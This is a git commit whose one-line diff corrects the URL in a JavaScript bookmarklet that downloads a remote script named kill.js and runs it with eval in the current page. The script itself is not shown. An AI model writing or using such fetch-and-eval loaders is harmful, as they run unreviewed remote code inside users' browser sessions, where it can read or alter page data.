19652ea12338834c02033182bd9f711ccadb99a4
EEEEEE74 <104216042+EEEEEE74@users.noreply.github.com>
2023-09-07 19:06:56 -0400

    Update bookmarklet.js

--- bookmarklet.js
+++ bookmarklet.js
@@ -1,1 +1,1 @@
-javascript:fetch("https://https://raw.githubusercontent.com/EEEEEE74/hahahabessechurgerbesofunnyhahaha1234123412341234/main/kill.js").then(r => r.text()).then(r => eval(r))
+javascript:fetch("https://raw.githubusercontent.com/EEEEEE74/hahahabessechurgerbesofunnyhahaha1234123412341234/main/kill.js").then(r => r.text()).then(r => eval(r))
